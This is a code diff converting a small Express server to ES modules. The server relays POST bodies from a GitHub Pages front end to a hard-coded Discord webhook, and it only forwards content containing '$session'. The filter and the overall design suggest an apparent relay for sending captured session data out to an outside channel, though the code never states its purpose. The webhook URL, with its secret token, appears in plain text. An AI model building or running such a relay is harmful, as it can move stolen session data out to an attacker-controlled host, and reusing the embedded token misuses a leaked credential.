@@ -1,45 +1,41 @@
-const express = require('express');
-const cors = require('cors');
-const fetch = require('node-fetch'); // Make sure to install node-fetch@2 for CommonJS compatibility
-const app = express();
+import express from 'express';
+import cors from 'cors';
+import fetch from 'node-fetch';
 
-const PORT = process.env.PORT || 10000;
-const DISCORD_WEBHOOK_URL = 'https://ptb.discord.com/api/webhooks/1363135609601917199/-XCwFzteRcZQW5u98yN9oP86P55-kaErK8QNP8m4p7eaTH1GTuRbaewg9qnx-ljs9J-k';
+const app = express();
+const port = process.env.PORT || 10000;
 
 app.use(cors({
-  origin: 'https://impatientzz.github.io', // Your frontend URL here (GitHub pages)
+  origin: 'https://impatientzz.github.io', // your frontend URL
+  methods: ['POST', 'OPTIONS']
 }));
 app.use(express.json());
 
+const WEBHOOK_URL = 'https://ptb.discord.com/api/webhooks/1363135609601917199/-XCwFzteRcZQW5u98yN9oP86P55-kaErK8QNP8m4p7eaTH1GTuRbaewg9qnx-ljs9J-k';
+
 app.post('/send-webhook', async (req, res) => {
   const { content } = req.body;
-
   if (!content || !content.includes('$session')) {
     return res.status(400).json({ error: 'Invalid content' });
   }
-
   try {
-    const discordRes = await fetch(DISCORD_WEBHOOK_URL, {
+    const response = await fetch(WEBHOOK_URL, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ content }),
     });
 
-    if (!discordRes.ok) {
-      const errorText = await discordRes.text();
-      return res.status(500).json({ error: `Discord webhook error: ${errorText}` });
+    if (!response.ok) {
+      const errText = await response.text();
+      return res.status(500).json({ error: 'Discord webhook error: ' + errText });
     }
 
-    res.json({ message: 'Webhook sent successfully' });
-  } catch (error) {
-    res.status(500).json({ error: error.message });
+    res.json({ success: true });
+  } catch (err) {
+    res.status(500).json({ error: 'Server error: ' + err.message });
   }
 });
 
-app.get('/', (req, res) => {
-  res.send('Backend proxy server is running!');
-});
-
-app.listen(PORT, () => {
-  console.log(`Server listening on port ${PORT}`);
+app.listen(port, () => {
+  console.log(`Server listening on port ${port}`);
 });
